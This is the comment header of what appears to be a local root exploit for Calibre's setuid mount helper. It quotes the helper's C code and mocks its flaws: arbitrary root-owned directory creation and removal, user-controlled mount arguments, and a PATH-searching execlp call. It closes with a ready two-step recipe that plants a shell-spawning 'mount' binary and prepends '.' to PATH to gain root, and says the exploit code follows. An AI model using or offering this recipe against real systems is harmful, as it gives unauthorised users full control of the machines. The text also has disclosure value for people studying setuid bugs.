# Calibre uses a suid mount helper, and like nearly all suid mount helpers that
# have come before it, it's badly broken. Let's go through Calibre's faulty code
# available at http://pastebin.com/auz9SULi and look at the array of silly
# things done, only one of which we actually need to get root.
#
# In this spot here, we can create a directory owned by root anywhere we want:
#
# 47        if (!exists(mp)) {
# 48            if (mkdir(mp, S_IRUSR|S_IWUSR|S_IXUSR|S_IRGRP|S_IXGRP|S_IROTH|S_IXOTH) != 0) {
# 49                errsv = errno;
# 50                fprintf(stderr, "Failed to create mount point with error: %s\n", strerror(errsv));
# 51            }
# 52        }
#
# At this point, we can remove any empty directory we want:
#
# 172       rmd = rmdir(mp);
#
# And elsewhere, we can create and remove anything_we_want/.some_stupid_marker.
# I'm sure you can figure out how to exploit these kinds of things :-P.
#
# We also get the ability with this wonderful mount-helper to unmount and eject
# any device that we want (as root), as well as mount any vfat filesystem that
# we'd like.
#
# Not only that, but we can pass params directly to mount, to some degree:
# 
# 83        execlp("mount", "mount", "-t", "auto", "-o", options, dev, mp, NULL);
#
# On this line, "dev" and "mp" are controlled by argv[2] and argv[3]. I'm sure
# you can find fun things to do with this as well. (There -s and also the man
# pages say the last -o is respected, etc etc. Be creative.)
#
# But there's also something lurking that is way worse in this line. Is that
# "execlp" we see? Yes.  According to the man pages:
#
#     The execlp(), execvp(), and execvpe() functions duplicate the  actions  of
#     the  shell  in searching  for  an  executable file if the specified
#     filename does not contain a slash (/) character.
#
# execlp searchs PATH for where to find "mount", and then runs it as root. And,
# with great joy, we find that we can trivially control PATH by setting it
# before running the mount helper. So the attack plan is simple:
#
#    1. Make an executable named "mount" in the current directory that executes
#       a shell.
#    2. PATH=".:$PATH" calibre-mount-helper mount something somethingelse
#
# And that's it! We have root. The below exploit creates things in a temporary
# directory that gets cleaned up and displays some status information along the
# way.
